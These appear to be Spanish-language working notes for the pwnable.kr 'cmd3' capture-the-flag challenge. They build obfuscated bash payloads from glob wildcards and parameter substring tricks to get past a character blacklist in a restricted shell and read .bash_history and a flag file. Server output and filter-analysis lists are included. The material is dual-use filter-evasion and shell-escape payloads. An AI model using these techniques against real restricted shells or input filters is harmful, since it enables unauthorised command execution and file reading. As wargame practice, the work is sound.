


__=	blacklist = '` !&|"\'*'

${#var}

__=~
___=??????
____=?
${__:${#___}:${#____}}

__=~;___=??????;____=?;${__:${#___}:${#____}}
__=~;___=??????;____=?;${__:${#___}:${#____}}?? -> cat
__=~;___=??????;____=?;$(${__:${#___}:${#____}}??)

$ var=/home/cmd3_pwn
user@kali:~/repositorios/pwnable/cmd3$ echo ${var:8:1}
__=~
___=????????
____=?
${__:${#___}:${#____}}

__=~;___=????????;____=?;${__:${#___}:${#____}}
__=~;___=????????;____=?;?${__:${#___}:${#____}} -> id



__=~;___=????????????;____=?;${__:${#___}:${#____}}


$ nc pwnable.kr 9023
total 5344
drwxr-x---  5 root cmd3_pwn    4096 Mar 15  2016 .
drwxr-xr-x 93 root root        4096 Oct 10 22:56 ..
d---------  2 root root        4096 Jan 22  2016 .bash_history
-rwxr-x---  1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py
drwx-wx---  2 root cmd3_pwn   24576 Oct 22 12:01 flagbox
drwxr-x---  2 root cmd3_pwn    4096 Jan 22  2016 jail
-rw-r--r--  1 root root     5422608 Oct 22 12:01 log
-rw-r-----  1 root root         764 Mar 10  2016 super.pl
total 8
drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .
drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..
lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -> /bin/cat
lrwxrwxrwx 1 root root       11 Jan 22  2016 id -> /usr/bin/id
lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -> /bin/ls
your password is in flagbox/9ZKB06BIMJ7Q5MSTCDFNQQB9J4XB18BA
cmd3$ ~
/bin/rbash: line 1: /home/cmd3_pwn: restricted: cannot specify `/' in command names
cmd3$ 



for comando in comandos:
    for i in range(len(comando)):
        if comando[i] not in abcdario:
            break
    else:
        print(comando)




CARACTERES PERMITIDOS
# $ % ( ) + , - . / : ; < = > ? @ [ \ ] ^ _ { } ~

LETRAS QUE TENEMOS
h o m e c d p w n

COMANDOS QUE TENEMOS
ls cat id

BUILT INS COMMANDS
'history', 'if', 'jobs', 'kill', 'let', 'local', 'logout', 'mapfile', 'popd', 'printf', 'pushd', 'pwd', 'read', 'readarray', 'readonly', 'return', 'select', 'set', 'shift', 'shopt', 'source', 'suspend', 'test', 'time', 'times', 'trap', 'true', 'type', 'typeset', 'ulimit', 'umask', 'unalias', 'unset', 'until', 'variables', 'wait', 'while', 'alias', 'bg', 'bind', 'break', 'builtin', 'caller', 'case', 'cd', 'command', 'compgen', 'complete', 'compopt', 'continue', 'coproc', 'declare', 'dirs', 'disown', 'echo', 'enable', 'eval', 'exec', 'exit', 'export', 'false', 'fc', 'fg', 'for', 'for', 'function', 'getopts', 'hash', help

BUILT INS QUE PODEMOS ESCRIBIR
popd, pwd, cd, echo

BUILT INS QUE PODEMOS CORRER
pwd, echo

VARIABLES DE AMBIENTE
['XDG_MENU_PREFIX','LANG','GDM_LANG','LESS','DISPLAY','OLDPWD','COLORTERM','DESKTOP_AUTOSTART_ID','USERNAME','JAVA_HOME','J2SDKDIR','XDG_VTNR','ZSH','SSH_AUTH_SOCK','XDG_SESSION_ID','DERBY_HOME','USER','PAGER','LSCOLORS','DESKTOP_SESSION','GNOME_TERMINAL_SCREEN','PWD','HOME','LC_CTYPE','J2REDIR','SSH_AGENT_PID','QT_ACCESSIBILITY','XDG_SESSION_TYPE','XDG_DATA_DIRS','XDG_SESSION_DESKTOP','GTK_MODULES','WINDOWPATH','TERM','SHELL','VTE_VERSION','XDG_CURRENT_DESKTOP','GPG_AGENT_INFO','GNOME_TERMINAL_SERVICE','SHLVL','XDG_SEAT','GDMSESSION','GNOME_DESKTOP_SESSION_ID','LOGNAME','DBUS_SESSION_BUS_ADDRESS','path','XDG_RUNTIME_DIR','XAUTHORITY','PATH','SESSION_MANAGER','_']

VARIABLES DE AMBIENTE QUE PODEMOS ESCRIBIR
PWD HOME


E
__=~;___=????;____=?;${__:${#___}:${#____}}
C
__=~;___=??????;____=?;${__:${#___}:${#____}}
H
__=~;___=?;____=?;${__:${#___}:${#____}}
O
__=~;___=??;____=?;${__:${#___}:${#____}}

ECHO
__=~;___=?;____=????;_____=??????;______=??;${__:${#____}:${#___}}${__:${#_____}:${#___}}${__:${#___}:${#___}}${__:${#______}:${#___}}

echo mas corto
__=~;___=?;____=????;_____=??????;______=??;${__:${#____}:${#___}}${__:${#_____}:${#___}}${__:${#___}:${#______}}



/home/cmd3_pwn

PW
__=~;___=???????????;____=??;${__:${#___}:${#____}}
D
__=~;___=????????;____=?;${__:${#___}:${#____}}

PWD
__=~;___=???????????;____=????????;_____=?;______=??;${__:${#___}:${#______}}${__:${#____}:${#_____}}


cmd3$ $_
/bin/rbash: line 1: /bin/rbash: restricted: cannot specify `/' in command names

/bin/rbash


i
__=$_;___=??;____=?;${__:${#___}:${#____}}
d
__=~;___=????????;____=?;${__:${#___}:${#____}}



i
prev=$_;dos=??;uno=?;${prev:${#dos}:${#uno}}
d
home=~;ocho=????????;uno=?;${home:${#ocho}:${#uno}}

home=~;prev=$_;uno=?;dos=??;ocho=????????;${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}}

id
___=$_;__=~;____=?;_____=??;______=????????;${___:${#_____}:${#____}}${__:${#______}:${#____}}

uid=1069(cmd3_pwn) gid=1069(cmd3_pwn) groups=1069(cmd3_pwn)


__=id;___=??????????????????;____=?;espacio=${__:___:____}


prev=$_;home=~;uno=?;dos=??;ocho=????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});dieciocho=??????????????????;espacio=${id:dieciocho:uno}



E
__=~;___=????;____=?;${__:${#___}:${#____}}
C
__=~;___=??????;____=?;${__:${#___}:${#____}}
H
__=~;___=?;____=?;${__:${#___}:${#____}}
O
__=~;___=??;____=?;${__:${#___}:${#____}}

ECHO
__=~;___=?;____=????;_____=??????;______=??;${__:${#____}:${#___}}${__:${#_____}:${#___}}${__:${#___}:${#___}}${__:${#______}:${#___}}

echo
home=~;uno=?;cuatro=????;seis=??????;dos=??;${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}



espacio=${id:${#dieciocho}:${#uno}}

prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;dieciocho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#dieciocho}:${#uno}}





h o m e c d p w n
uid=1069(cmd3_pwn) gid=1069(cmd3_pwn) groups=1069(cmd3_pwn)

h o m e c d p w n u i g r s

/bin/rbash




CARACTERES PERMITIDOS
# $ % ( ) + , - . / : ; < = > ? @ [ \ ] ^ _ { } ~

LETRAS QUE TENEMOS
h o m e c d p w n u i g r s b a

COMANDOS QUE TENEMOS
ls cat id

BUILT INS QUE PODEMOS ESCRIBIR

popd, pushd, pwd, read, source, suspend, bg, bind, case, cd, command, compgen, coproc, dirs, disown, echo, hash



prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;dieciocho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#dieciocho}:${#uno}}


${#}

__=$_;___=~;____=?;_____=??;______=????????;_______=??????????????????;________=$(${__:${#_____}:${#____}}${___:${#______}:${#____}});${________:${#_______}:${#____}}

__=$_;___=~;____=?;_____=??;______=????????;_______=??????????????????;${__:${#_____}:${#____}}${___:${#______}:${#____}}


echo espacio .bash_history
prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????


var=$(echo espacio .bash_history)
prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashHistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????)

.bash_history
nueve=?????????
T
${bashHistory:nueve:uno}


cat<???????/????????????????????????????????


C
home=~;seis=??????;uno=?;${home:${#seis}:${#uno}}
A
${bashHistory:dos:uno}



cat<log
prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}<???

cat ???????/????????????????????????????????
prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}???????/????????????????????????????????


__=$_;___=~;____=?;_____=??;______=????;_______=??????;________=????????;_________=?????????;__________=??????????????????;___________=$(${__:${#_____}:${#____}}${___:${#________}:${#____}});____________=$(${___:${#______}:${#____}}${___:${#_______}:${#____}}${___:${#____}:${#_____}}${___________:${#__________}:${#____}}.????????????);${___:${#_______}:${#____}}${____________:${#_____}:${#____}}${____________:${#_________}:${#____}}${___________:${#__________}:${#____}}????.??


